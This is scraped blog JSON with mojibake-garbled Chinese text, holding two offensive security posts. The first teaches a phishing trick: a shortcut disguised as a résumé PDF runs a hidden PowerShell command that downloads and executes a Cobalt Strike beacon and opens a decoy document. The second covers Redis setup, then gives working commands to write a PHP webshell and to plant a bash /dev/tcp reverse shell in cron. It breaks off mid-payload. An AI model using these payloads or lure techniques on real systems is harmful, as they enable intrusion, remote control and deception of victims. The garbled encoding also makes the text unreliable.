äºŒã€åˆä½“éªŒæ‰¾åˆ°è®¡ç®—å™¨æ‰€åœ¨ç›®å½•ï¼Œåˆ›å»ºå¿«æ·æ–¹å¼ ä¸‹å›¾ä¸ºcalc.exeçš„å¿«æ·æ–¹å¼çš„å±æ€§ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨â€œç›®æ ‡â€æ å†™å…¥è‡ªå·±çš„æ¶æ„å‘½ä»¤ï¼Œå¦‚powershellä¸Šçº¿å‘½ä»¤ è¿™é‡Œä»¥ä½¿ç”¨cmdè°ƒç”¨è®¡ç®—å™¨ä¸ºä¾‹ C:\\Windows\\System32\\cmd.exe /c calc.exe# cmd /c å‘½ä»¤ æ‰§è¡Œå®Œå‘½ä»¤åå…³é—­å‘½ä»¤çª—å£# cmd /k å‘½ä»¤ æ‰§è¡Œå®Œå‘½ä»¤åä¸å…³é—­å‘½ä»¤çª—å£ æ­¤æ—¶ç‚¹å‡»ç‚¹å‡»è¯¥å¿«æ·æ–¹å¼ï¼Œé»‘æ¡†ä¸€é—ªå°±å¼¹å‡ºè®¡ç®—å™¨ ä¸‰ã€å›¾æ ‡é—®é¢˜è€Œåœ¨å®æ–½é’“é±¼è¿‡ç¨‹ä¸­ï¼Œå¯¹äºæˆ‘ä»¬çš„calc.exeçš„å¿«æ·æ–¹å¼æ¥è¯´ï¼Œä¸€ä¸ªå¤§å¤§çš„è®¡ç®—æœºicoå›¾æ ‡ï¼Œæ˜¾ç„¶çœ‹èµ·æ¥ä¸åƒä¸€ä¸ªå¥½ç©æ„ï¼Œå› æ­¤å¯ä»¥å°è¯•åœ¨â€œå±æ€§â€ä¸­å»æ›´æ”¹è¯¥æ–‡ä»¶çš„å›¾æ ‡ï¼š å›¾æ ‡æ–‡ä»¶è·¯å¾„ï¼š%SystemRoot%\\System32\\shell32.dll éšä¾¿é€‰ä¸€ä¸ªåï¼Œå¦‚ä¸‹æ‰€ç¤º ä½†æ˜¯ç”¨ç³»ç»Ÿè‡ªå¸¦çš„icoå»åšæ–‡ä»¶å›¾æ ‡æ›¿æ¢çš„è¯ï¼Œæœ‰ä¸ªå¼Šç«¯ï¼Œå³å½“æ›¿æ¢çš„icoåœ¨ç›®æ ‡æœºå™¨ä¸Šä¸å­˜åœ¨æ—¶ï¼Œå°±ä¼šå‡ºç°ç±»ä¼¼ç©ºç™½icoå›¾æ ‡ï¼š ç”¨010 Editoræ‰“å¼€è¯¥LNKæ–‡ä»¶ï¼Œæ‰¾åˆ°String Dataéƒ¨åˆ†ICON_LOCATIONå­—ç¬¦ä¸² æ ¹æ®crazymanå¸ˆå‚…æ‰€è¯´ï¼Œä¿®æ”¹lnkçš„icon_locationæ ‡å¿—ä½ï¼Œä¿®æ”¹ä¸ºç›¸å…³åç¼€ï¼Œç³»ç»Ÿå³å¯â¾ƒåŠ¨è”æƒ³åˆ°å¯¹åº”çš„æ‰“å¼€â½…å¼ã€‚ å…·ä½“åŸç†å‚è€ƒï¼šhttps://bbs.pediy.com/thread-260953.htm æˆ‘ä»¬è¦å°†å…¶ä¿®æ”¹ä¸º.\\1.pdf(Unicode)ï¼Œå…¶é•¿åº¦0x07ï¼š ä¿å­˜ä¿®æ”¹åï¼Œæ­¤æ—¶calc.exeçš„å¿«æ·æ–¹å¼å›¾æ ‡ä¸ºPDFçš„äº† â½å¦‚æˆ‘çš„pdfé»˜è®¤æ˜¯ç”±edgeæµè§ˆå™¨æ‰“å¼€ï¼Œåˆ™åœ¨icon_locationä¸­è®¾ç½®ä¸ºpdfåç¼€æ—¶ï¼Œâ½‚ä»¶çš„icoä¹Ÿä¼šè‡ªåŠ¨æ˜¾ç¤ºä¸ºedgeæµè§ˆå™¨æ‰“å¼€çš„å›¾æ ‡ï¼Œ è¿™æ ·å¯ä»¥è¾¾åˆ°â¾ƒé€‚é…çš„æ•ˆæœ å››ã€è¿›é˜¶ä¼ªè£…å½“å—å®³è€…ä¸­æ‹›æ‰“å¼€æˆ‘ä»¬çš„æ‰€è°“çš„pdfï¼Œå®åˆ™ä¸ºæ¶æ„çš„å¿«æ·æ–¹å¼æ—¶ï¼ŒåŒå‡»ä¸¤ä¸‹ï¼Œä»€ä¹ˆååº”éƒ½æ²¡æœ‰ï¼Œå¯èƒ½ä¼šæœ‰ä¸€ä¸ç–‘æƒ‘ï¼Œå› æ­¤å¯ä»¥å½“å°è¯•ç”¨powershellã€mshtaç­‰æ–¹å¼ä¸Šçº¿æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ”¹å¦‚cobaltstrikeç”Ÿæˆçš„ä»£ç ï¼ŒåŠ ä¸Šä¸€æ®µè‡ªåŠ¨ä¸‹è½½æ‰“å¼€ä¸€ä»½çœŸçš„pdfï¼Œæ¥è¾¾åˆ°é€¼çœŸçš„æ•ˆæœã€‚ äº”ã€ä½¿ç”¨cobaltstrike1ã€åˆ›å»ºç›‘å¬å™¨è¿™é‡Œå°±åˆ›å»ºç»™Beacon HTTP 2ã€ç”Ÿæˆåé—¨ä»£ç  powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.1.105:80/a&#x27;))&quot;[+] -nopï¼šNoProfileï¼Œä½¿ç”¨æ­¤å‚æ•°é˜»æ­¢PowerShellåœ¨å¼€æœºæ—¶åŠ è½½é…ç½®æ–‡ä»¶è„šæœ¬ï¼Œä»¥é¿å…è½½å…¥éé¢„æœŸçš„å‘½ä»¤æˆ–è®¾ç½®[+] -wï¼šWindowStyleï¼Œå°†çª—å£æ ·å¼è®¾ç½®ä¸º Normalã€Minimizedã€Maximized æˆ– Hiddenã€‚[+] -cï¼šCommandï¼Œæ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤(å’Œä»»ä½•å‚æ•°)[+] IEX (New-Object Net.WebClient).DownloadString(&#x27;#&#123;remote_script&#125;&#x27;); è¯¥å‘½ä»¤å°†#&#123;remote_script&#125;åŠ è½½åˆ°å†…å­˜ï¼Œå¹¶æ²¡æœ‰æŠŠè¯¥è„šæœ¬ä¸‹è½½åˆ°æœ¬åœ°[+] Iexå‘½ä»¤ä¸ºinvove-expressionçš„åˆ«åï¼šæ¥æ”¶ä¸€ä¸ªå­—ç¬¦ä¸²ä½œä¸ºè¦è¿è¡Œçš„å®Œæ•´å‘½ä»¤ï¼ˆåŒ…æ‹¬å‚æ•°ï¼‰ã€‚ 3ã€åˆ›å»ºå¿«æ·æ–¹å¼lnkæ–‡ä»¶é¦–å…ˆè¦çŸ¥é“PowerShell.exeç›®å½•ï¼šC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\ åˆ›å»ºå¿«æ·æ–¹å¼ï¼Œåœ¨å¯¹è±¡çš„ä½ç½®å°†ç›®å½•å’Œæœ¨é©¬ä»£ç æ‹¼æ¥èµ·æ¥ C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.1.105:80/a&#x27;))&quot; å‘½åä¸ºç®€å†.pdf 4ã€ä¿®æ”¹å›¾æ ‡ä»»æ„é€‰æ‹©%systemroot%\\system32\\shell32.dllçš„ä¸€ä¸ªå›¾æ ‡ ä½¿ç”¨ä¸Šé¢çš„æ–¹æ³•ï¼Œæ›´æ”¹ä¸ºPDFè‡ªé€‚é… 5ã€åˆçº§åå¼¹shellç”¨æˆ·åŒå‡»åšå¥½çš„ç®€å†.pdfï¼Œå³å¯åå¼¹shell 6ã€ä½¿ç”¨çœŸæ­£çš„PDFæ–‡ä»¶ä¼ªè£…å½“å—å®³è€…ä¸­æ‹›æ‰“å¼€æˆ‘ä»¬çš„æ‰€è°“çš„pdfï¼Œå®åˆ™ä¸ºæ¶æ„çš„å¿«æ·æ–¹å¼æ—¶ï¼ŒåŒå‡»ä¸¤ä¸‹ï¼Œä»€ä¹ˆååº”éƒ½æ²¡æœ‰ï¼Œå¯èƒ½ä¼šæœ‰ä¸€ä¸ç–‘æƒ‘ï¼Œå› æ­¤å¯ä»¥å½“å°è¯•ç”¨powershellã€mshtaç­‰æ–¹å¼ä¸Šçº¿æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ”¹å¦‚cobaltstrikeç”Ÿæˆçš„ä»£ç ï¼ŒåŠ ä¸Šä¸€æ®µè‡ªåŠ¨ä¸‹è½½æ‰“å¼€ä¸€ä»½çœŸçš„pdfï¼Œæ¥è¾¾åˆ°é€¼çœŸçš„æ•ˆæœã€‚ åœ¨ç®€å†.pdfçš„å¯¹è±¡ä½ç½®ä¸­ï¼Œå¯ä»¥æ›´æ”¹ä»£ç ä¸ºå¦‚ä¸‹ C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c &quot;(new-object net.webclient).DownloadFile(&#x27;http://192.168.1.105:8081/ç®€å†.pdf&#x27;,&#x27;$env:TEMP\\ç®€å†.pdf&#x27;);cd $env:TEMP;./ç®€å†.pdf;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.1.105:80/a&#x27;))&quot; ä½†æ˜¯æœ‰ä¸ªé—®é¢˜ï¼Œå°±æ˜¯ä¸Šé¢çš„ä»£ç å¤ªé•¿äº†ï¼Œæ”¾ä¸ä¸‹ ä¹Ÿå°è¯•ä½¿ç”¨å˜é‡æ¥ä»£æ›¿åœ°å€æˆ–è€…new-object net.webclientï¼Œä½†æ˜¯éƒ½å‡ºç°äº†è®¸å¤šæŠ¥é”™é—®é¢˜ï¼ŒæŠ˜è…¾äº†ä¸€ä¸ªä¸‹åˆéƒ½æ²¡æå®šï¼ˆåç»­ä¼šç»§ç»­æ¢ç´¢è§£å†³æ–¹æ¡ˆï¼‰ å› æ­¤è¿™é‡Œå°±ä½¿ç”¨é€šè¿‡ä¸‹è½½PSè„šæœ¬ï¼Œé€šè¿‡æ‰§è¡Œè„šæœ¬æ¥è¿›è¡Œ eval.ps1éƒ¨ç½²åœ¨Kaliä¸‹ï¼Œå†…å®¹ä¸º C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c &quot;(new-object net.webclient).DownloadFile(&#x27;http://192.168.1.105:8081/ç®€å†.pdf&#x27;,&#x27;$env:TEMP\\ç®€å†.pdf&#x27;);cd $env:TEMP;./ç®€å†.pdf;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.1.105:80/a&#x27;))&quot; ç›®æ ‡æ”¹ä¸º æ–¹æ³•ä¸€æµ‹è¯•æ— ååº”ï¼šC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -w hidden -nop -NonI IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.1.105:8081/eval.ps1&quot;)æ–¹æ³•äºŒæµ‹è¯•æˆåŠŸï¼šC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy bypass -nop -w hidden -c &quot;(new-object net.webclient).DownloadFile(&#x27;http://192.168.1.105:8081/eval.ps1&#x27;,&#x27;$env:TEMP\\eval.ps1&#x27;);cd $env:TEMP;./eval.ps1&quot; 7ã€ä½¿ç”¨çœŸæ­£PDFä¼ªè£…äº†çš„åå¼¹shellä¸‹é¢çš„åŠ¨å›¾ï¼Œå±•ç¤ºäº†æ‰“å¼€ä¸€ä¸ªå¿«æ·æ–¹å¼é’“é±¼æ–‡ä»¶æ—¶ï¼Œé€¼çœŸçš„æ‰“å¼€äº†çœŸå®çš„ç®€å†ï¼Œç„¶ååœ¨èƒŒåæ‚„æ‚„çš„ä¸Šäº†çº¿ï¼š å…­ã€å‚è€ƒé“¾æ¥ https://security.tencent.com/index.php/blog/msg/165 https://bbs.pediy.com/thread-260953.htm https://blog.csdn.net/qq_28808697/article/details/103036894","categories":[{"name":"APT/ç¤¾å·¥","slug":"APT-ç¤¾å·¥","permalink":"https://wolke.cn/categories/APT-%E7%A4%BE%E5%B7%A5/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://wolke.cn/tags/CobaltStrike/"},{"name":"é’“é±¼","slug":"é’“é±¼","permalink":"https://wolke.cn/tags/%E9%92%93%E9%B1%BC/"},{"name":"ç¤¾å·¥","slug":"ç¤¾å·¥","permalink":"https://wolke.cn/tags/%E7%A4%BE%E5%B7%A5/"},{"name":"APT","slug":"APT","permalink":"https://wolke.cn/tags/APT/"}],"author":"w01ke"},{"title":"Rediså®‰å…¨","slug":"Rediså®‰å…¨","date":"2022-02-22T14:00:11.000Z","updated":"2022-03-10T04:17:54.724Z","comments":true,"path":"post/472fbc5b.html","link":"","permalink":"https://wolke.cn/post/472fbc5b.html","excerpt":"","text":"ä¸€ã€Redisä»‹ç»Redisï¼ˆRemote Dictionary Serverï¼‰è¯‘ä¸ºâ€œè¿œç¨‹å­—å…¸æœåŠ¡â€ï¼Œå®ƒæ˜¯ä¸€æ¬¾åŸºäºå†…å­˜å®ç°çš„é”®å€¼å‹ NoSQL æ•°æ®åº“ï¼Œ é€šå¸¸ä¹Ÿè¢«ç§°ä¸ºæ•°æ®ç»“æ„æœåŠ¡å™¨ï¼Œè¿™æ˜¯å› ä¸ºå®ƒå¯ä»¥å­˜å‚¨å¤šç§æ•°æ®ç±»å‹ï¼Œæ¯”å¦‚ stringï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼Œhashï¼ˆå“ˆå¸Œæ•£åˆ—ï¼‰ï¼Œlistï¼ˆåˆ—è¡¨ï¼‰ï¼Œsetï¼ˆé›†åˆï¼‰å’Œ sorted setï¼ˆæœ‰åºé›†åˆï¼‰ç­‰ã€‚ å¯ä»¥å¯¹å†…å­˜ä¸­çš„æ•°æ®ç›´æ¥å­˜å–ï¼Œä¹Ÿå¯ä»¥å†™åˆ°ç¡¬ç›˜ä¸­å»ã€‚é»˜è®¤ç«¯å£ä¸º6379 Nosqlæ•°æ®åº“çš„ç‰¹ç‚¹æ˜¯ï¼š å®¹æ˜“æ‰©å±•ï¼šNoSQLæ•°æ®åº“ç§ç±»ç¹å¤šï¼Œä½†æ˜¯ä¸€ä¸ªå…±åŒçš„ç‰¹ç‚¹éƒ½æ˜¯å»æ‰å…³ç³»æ•°æ®åº“çš„å…³ç³»å‹ç‰¹æ€§ã€‚æ•°æ®ä¹‹é—´æ— å…³ç³»ï¼Œè¿™æ ·å°±éå¸¸å®¹æ˜“æ‰©å±•ã€‚æ— å½¢ä¹‹é—´ï¼Œåœ¨æ¶æ„çš„å±‚é¢ä¸Šå¸¦æ¥äº†å¯æ‰©å±•çš„èƒ½åŠ›ã€‚ å¤§æ•°æ®é‡ã€é«˜æ€§èƒ½ï¼šNoSQLæ•°æ®åº“éƒ½å…·æœ‰éå¸¸é«˜çš„è¯»å†™æ€§èƒ½ï¼Œå°¤å…¶åœ¨å¤§æ•°æ®é‡ä¸‹ï¼ŒåŒæ ·è¡¨ç°ä¼˜ç§€ã€‚è¿™å¾—ç›Šäºå®ƒçš„æ— å…³ç³»æ€§ï¼Œæ•°æ®åº“çš„ç»“æ„ç®€å•ã€‚ ä¸€èˆ¬MySQLä½¿ç”¨Query Cacheã€‚NoSQLçš„Cacheæ˜¯è®°å½•çº§çš„ï¼Œæ˜¯ä¸€ç§ç»†ç²’åº¦çš„Cacheï¼Œæ‰€ä»¥NoSQLåœ¨è¿™ä¸ªå±‚é¢ä¸Šæ¥è¯´æ€§èƒ½å°±è¦é«˜å¾ˆå¤šã€‚ çµæ´»çš„æ•°æ®æ¨¡å‹ï¼šNoSQLæ— é¡»äº‹å…ˆä¸ºè¦å­˜å‚¨çš„æ•°æ®å»ºç«‹å­—æ®µï¼Œéšæ—¶å¯ä»¥å­˜å‚¨è‡ªå®šä¹‰çš„æ•°æ®æ ¼å¼ã€‚è€Œåœ¨å…³ç³»æ•°æ®åº“é‡Œï¼Œå¢åˆ å­—æ®µæ˜¯ä¸€ä»¶éå¸¸éº»çƒ¦çš„äº‹æƒ…ã€‚å¦‚æœæ˜¯éå¸¸å¤§æ•°æ®é‡çš„è¡¨ï¼Œå¢åŠ å­—æ®µç®€ç›´å°±æ˜¯â€”â€”ä¸ªå™©æ¢¦ã€‚è¿™ç‚¹åœ¨å¤§æ•°æ®é‡çš„Web 2.0æ—¶ä»£å°¤å…¶æ˜æ˜¾ã€‚ é«˜å¯ç”¨ï¼šNoSQLåœ¨ä¸å¤ªå½±å“æ€§èƒ½çš„æƒ…å†µï¼Œå°±å¯ä»¥æ–¹ä¾¿åœ°å®ç°é«˜å¯ç”¨çš„æ¶æ„ã€‚æ¯”å¦‚Cassandraã€HBaseæ¨¡å‹ï¼Œé€šè¿‡å¤åˆ¶æ¨¡å‹ä¹Ÿèƒ½å®ç°é«˜å¯ç”¨ã€‚ nosqlæ•°æ®åº“ç§ç±»ç¹å¤šï¼Œä½†æ˜¯å®ƒä»¬éƒ½æœ‰ä¸€ä¸ªå…±åŒçš„ç‰¹ç‚¹ï¼Œå°±æ˜¯å®ƒä»¬éƒ½å»æ‰äº†å…³ç³»æ•°æ®åº“çš„å…³ç³»å‹ç‰¹æ€§ï¼Œä½¿ç”¨é”®å€¼å‹ äºŒã€Ubuntuéƒ¨ç½²Redis1ã€ä¸‹è½½å’Œå®‰è£…æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯Ubuntuè¿›è¡Œä¸‹è½½ wget http://download.redis.io/releases/redis-4.0.9.tar.gz è§£å‹ tar zxvf redis-4.0.9.tar.gz ç§»åŠ¨è§£å‹åçš„æ–‡ä»¶å¤¹åˆ°/usr/local/redisç›®å½•ä¸‹ sudo mv ./redis-4.0.9 /usr/local/redis è¿›å…¥åˆ°/usr/local/redisç›®å½•ä¸‹ï¼Œmake testç¼–è¯‘ä¸€ä¸‹ make test æŠ¥é”™äº†ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯ make distclean &amp;&amp; make é”™è¯¯çš„æœ¬è´¨æ˜¯æˆ‘ä»¬åœ¨å¼€å§‹æ‰§è¡Œmake æ—¶é‡åˆ°äº†é”™è¯¯ï¼ˆå¤§éƒ¨åˆ†æ˜¯ç”±äºgccæœªå®‰è£…ï¼‰ï¼Œç„¶åæˆ‘ä»¬å®‰è£…å¥½äº†gcc åï¼Œæˆ‘ä»¬å†æ‰§è¡Œmake ,è¿™æ—¶å°±å‡ºç°äº†jemalloc/jemalloc.h: No such file or directoryã€‚è¿™æ˜¯å› ä¸ºä¸Šæ¬¡çš„ç¼–è¯‘å¤±è´¥ï¼Œæœ‰æ®‹ç•™çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦æ¸…ç†ä¸‹ï¼Œç„¶åé‡æ–°ç¼–è¯‘å°±å¯ä»¥äº†ã€‚ æç¤ºä»¥ä¸‹ä¿¡æ¯è¯´æ˜æ²¡é—®é¢˜äº† å†æ¬¡æ‰§è¡Œ make test â€‹ å¤§æ¦‚8åˆ†é’Ÿå·¦å³çš„ç¼–è¯‘åï¼Œå‡ºç°ç»¿è‰²å­—ä½“çš„ä¿¡æ¯ï¼Œè¯´æ˜æ²¡é—®é¢˜ è¿›å…¥/usr/local/redis/srcç›®å½•ä¸‹ï¼Œçœ‹åˆ°æœ‰ä»¥ä¸‹å‘½ä»¤ï¼Œè¯´æ˜çš„ç¡®æ²¡é—®é¢˜äº†ï¼Œç¼–è¯‘å®‰è£…æˆåŠŸ # æ–¹ä¾¿æ‰¾åˆ°sudo mkdir /etc/redis sudo cp /usr/local/redis/redis.conf /etc/redis/ 2ã€ä¿®æ”¹é…ç½®æ–‡ä»¶ä¿®æ”¹å¹¶ä¿å­˜é…ç½®æ–‡ä»¶ 3ã€è¿è¡ŒRedisæœåŠ¡ç«¯ä»¥/etc/redis/redis.confçš„é…ç½®æ–‡ä»¶å¯åŠ¨RedisæœåŠ¡ç«¯ ./redis-server /etc/redis/redis.conf æŸ¥çœ‹æ˜¯å¦å¼€å¯Redis ps aux | grep redis 4ã€å®¢æˆ·ç«¯è¿æ¥æœåŠ¡ç«¯./redis-cli -h 192.168.1.117 å¯ä»¥çœ‹åˆ°ï¼Œå½“ä¿å­˜äº†æ•°æ®åï¼Œsrcç›®å½•ä¸‹ä¼šæœ‰dump.rdbï¼Œçœ‹ä¸€ä¸‹å¯ä»¥å¤§æ¦‚çŸ¥é“ï¼Œè¿™åº”è¯¥å­˜å‚¨äº†å½“æ—¶æˆ‘ä»¬åˆ›å»ºçš„é”®å€¼å¯¹ï¼ˆå½“ç„¶ï¼Œå¦‚æœé€šè¿‡cpå‘½ä»¤å°†redis-serveråŠ å…¥åˆ°/usr/binç›®å½•ä¸‹ï¼Œé‚£ä¹ˆåœ¨å½“å‰ç›®å½•ä¸‹è¿è¡Œçš„redisï¼Œé‚£ä¹ˆå°±ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆdump.rdbï¼Œä¸ä¸€å®šåœ¨srcç›®å½•ä¸‹ï¼‰ è¿™é‡Œå¯ä»¥çŸ¥é“ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¿æ¥Redisæ˜¯æ— éœ€å¯†ç çš„ï¼Œå› æ­¤æ—¥å¸¸å¯ä»¥ä¼šå› ä¸ºç®¡ç†å‘˜ç–å¿½è€Œå­˜åœ¨Redisæœªæˆæƒç™»å½•çš„é—®é¢˜ï¼ˆç”¨Telnetä¹Ÿå¯ä»¥è¿æ¥ telnet IP portï¼‰ å› ä¸ºå®˜æ–¹è¯´æ˜saveé»˜è®¤ä¿å­˜çš„æ˜¯rdbæ–‡ä»¶ï¼Œredis-bits?@?ctimeå°±æ˜¯rdbæ ‡è¯†ç¬¦ï¼Œå®æˆ˜å¯ä»¥æŠŠå®ƒçœ‹æˆè„æ•°æ® ä¸‰ã€Kaliå®‰è£…Redis-cli1ã€ä¸‹è½½å®‰è£…wget http://download.redis.io/redis-stable.tar.gz è§£å‹ tar -zxvf redis-stable.tar.gz å¯ä»¥çœ‹åˆ°æœ‰ä¸ªmakefileï¼Œç›´æ¥makeï¼Œå…¨å±€ç”Ÿæ•ˆ 2ã€åŠ å…¥ç¯å¢ƒå˜é‡sudo cp redis-cli /usr/bin 3ã€è¿æ¥Ubuntuçš„RedisæœåŠ¡redis-cli -h 192.168.1.117 å››ã€è®¾ç½®å¯†ç ç™»å½•ä¹‹å‰è¯´è¿‡ï¼Œé»˜è®¤æƒ…å†µä¸‹Redisæ˜¯å…å¯†ç™»é™†çš„ï¼Œé‚£ä¹ˆå°±å­˜åœ¨æœªæˆæƒç™»å½•çš„é£é™©ã€‚é‚£ä¹ˆå¦‚ä½•è®¾ç½®å¯†ç ç™»å½•å‘¢ï¼Ÿ æ‰“å¼€é…ç½®æ–‡ä»¶ï¼Œé…ç½®å¯†ç ä¸ºhaha123ï¼Œå¦‚å›¾æ‰€ç¤º requirepass haha123 å…³é—­RedisæœåŠ¡ shutdownps aux | grep redis å¯åŠ¨RedisæœåŠ¡ redis-server /etc/redis/redis.confps aux | grep redis å®¢æˆ·ç«¯è¿æ¥ auth [username] passwordæˆ–è€…ç›´æ¥redis-cli -h [ip] -a [password] äº”ã€å¸¸è§å‘½ä»¤ å‘½ä»¤ æè¿° info æŸ¥çœ‹ä¿¡æ¯ flushall åˆ é™¤æ‰€æœ‰æ•°æ®åº“å†…å®¹ flushdb åˆ·æ–°æ•°æ®åº“ KEYS * æŸ¥çœ‹æ‰€æœ‰é”®,ä½¿ç”¨ select num å¯ä»¥æŸ¥çœ‹é”®å€¼æ•°æ® set test â€œwho am iâ€ è®¾ç½®å˜é‡ config set dir dirpath è®¾ç½®è·¯å¾„ç­‰é…ç½® save ä¿å­˜ get å˜é‡ æŸ¥çœ‹å˜é‡åç§° å…­ã€ç›¸å…³æ¼æ´å› é…ç½®ä¸å½“å¯ä»¥æœªç»æˆæƒè®¿é—®ï¼Œæ”»å‡»è€…æ— éœ€è®¤è¯å°±å¯ä»¥è®¿é—®åˆ°å†…éƒ¨æ•°æ®ï¼Œå…¶æ¼æ´å¯å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼ˆRedisæœåŠ¡å™¨å­˜å‚¨ä¸€äº›æœ‰è¶£çš„sessionã€cookieæˆ–å•†ä¸šæ•°æ®å¯ä»¥é€šè¿‡getæšä¸¾é”®å€¼ï¼‰ï¼Œä¹Ÿå¯ä»¥æ¶æ„æ‰§è¡Œflushallæ¥æ¸…ç©ºæ‰€æœ‰æ•°æ®ï¼Œæ”»å‡»è€…è¿˜å¯é€šè¿‡EVALæ‰§è¡Œluaä»£ç ï¼Œæˆ–é€šè¿‡æ•°æ®å¤‡ä»½åŠŸèƒ½å¾€ç£ç›˜å†™å…¥åé—¨æ–‡ä»¶ã€‚å¦‚æœRedisä»¥rootèº«ä»½è¿è¡Œï¼Œå¯ä»¥ç»™rootè´¦æˆ·å†™å…¥SSHå…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥å…å¯†ç ç™»å½•æœåŠ¡å™¨ï¼Œå…¶ç›¸å…³æ¼æ´ä¿¡æ¯å¦‚ä¸‹ï¼š 1ã€Redis è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(CVE-2016-8339)Redis 3.2.x &lt; 3.2.4ç‰ˆæœ¬å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œå¯å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚Redisæ•°æ®ç»“æ„å­˜å‚¨çš„CONFIG SETå‘½ä»¤ä¸­client-output-buffer-limité€‰é¡¹å¤„ç†å­˜åœ¨è¶Šç•Œå†™æ¼æ´ã€‚æ„é€ çš„CONFIG SETå‘½ä»¤å¯å¯¼è‡´è¶Šç•Œå†™ï¼Œä»£ç æ‰§è¡Œã€‚ 2ã€CVE-2015-8080Redis 2.8.xåœ¨2.8.24ä»¥å‰å’Œ3.0.x åœ¨3.0.6ä»¥å‰ç‰ˆæœ¬ï¼Œlua_struct.cä¸­å­˜åœ¨getnumå‡½æ•°æ•´æ•°æº¢å‡ºï¼Œå…è®¸ä¸Šä¸‹æ–‡ç›¸å…³çš„æ”»å‡»è€…è®¸å¯è¿è¡ŒLuaä»£ç ï¼ˆå†…å­˜æŸåå’Œåº”ç”¨ç¨‹åºå´©æºƒï¼‰æˆ–å¯èƒ½ç»•è¿‡æ²™ç›’é™åˆ¶æ„å›¾é€šè¿‡å¤§é‡ï¼Œè§¦å‘åŸºäºæ ˆçš„ç¼“å†²åŒºæº¢å‡ºã€‚ 3ã€CVE-2015-4335Redis 2.8.1ä¹‹å‰ç‰ˆæœ¬å’Œ3.0.2ä¹‹å‰3.xç‰ˆæœ¬ä¸­å­˜åœ¨å®‰å…¨æ¼æ´ã€‚è¿œç¨‹æ”»å‡»è€…å¯æ‰§è¡Œevalå‘½ä»¤åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„Luaå­—èŠ‚ç  4ã€CVE-2013-7458è¯»å–â€œ.rediscli_historyâ€é…ç½®æ–‡ä»¶ä¿¡æ¯ ä¸ƒã€Rediså†™æ–‡ä»¶1ã€å†™å…¥Webshellåªè¦çŸ¥é“ web ç»å¯¹è·¯å¾„å¹¶ä¸”æƒé™è¶³å¤Ÿå°±å¯ä»¥å†™ä¸ª webshell 192.168.1.117:6379&gt; CONFIG SET dir /usr/share/apache/htdocs/ #è¿™é‡Œæ˜¯ç«™ç‚¹ç»å¯¹è·¯å¾„ï¼ˆæˆ‘è¿™é‡ŒUbuntuæ²¡æœ‰å®‰è£…ä¸­é—´ä»¶ï¼Œåªä½œä¸ºæ¼”ç¤ºå‚è€ƒï¼‰OK 192.168.1.117:6379&gt; set shell &quot;&lt;?php echo system($_REQUEST[cmd]);?&gt;&quot; OK192.168.1.117:6379&gt; CONFIG SET dbfilename shell.php OK192.168.1.117:6379&gt; save #å°†å†…å­˜ä¸­çš„æ•°æ®ä¿å­˜åˆ°dbfilenameä¸­ OK MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on diskã€‚ å¦‚æœæŠ¥é”™æ— æ³•å‘ç£ç›˜å†™å…¥rdbï¼Œå°è¯•å°†stop-writes-on-bgsave-errorè®¾ç½®ä¸ºnoï¼Œå¦‚config set stop-writes-on-bgsave-error no 2ã€è®¡åˆ’ä»»åŠ¡å¯åŠ¨åå¼¹shellåœ¨ linux ç³»çš„ç³»ç»Ÿæœ‰ç€å®šæ—¶ä»»åŠ¡çš„åŠŸèƒ½ï¼Œåªè¦æ–‡ä»¶å¯ä»¥å†™åˆ°å®šæ—¶ä»»åŠ¡ç›®å½•é‡Œå°±å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ ï¼ˆ1ï¼‰å‘½ä»¤åˆæµ‹è¯•Kaliå¼€å¯ncç›‘å¬ Ubuntuæ‰§è¡Œå‘½ä»¤ bash -i &gt;&amp; /dev/tcp/192.168.236.129/9999 0&gt;&amp;1 â€‹ æ­¤æ—¶æˆåŠŸåå¼¹shellåˆ°nc å‘½ä»¤æ˜¯æ²¡æœ‰é—®é¢˜çš„ ï¼ˆ2ï¼‰/var/spool/cron/ç”¨æˆ·å æµ‹è¯•192.168.1.117:6379&gt; pingPONG192.168.1.117:6379&gt; config set dir /var/spool/cron/ //æ¯ä¸ªç”¨æˆ·ç”Ÿæˆçš„crontabæ–‡ä»¶ï¼Œéƒ½ä¼šæ”¾åœ¨ /var/spool/cron/ ç›®å½•ä¸‹é¢OK192.168.1.117:6379&gt; set haha &quot;\\n\\n\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.105/9999 0&gt;&amp;1\\n\\n\\n&quot; // 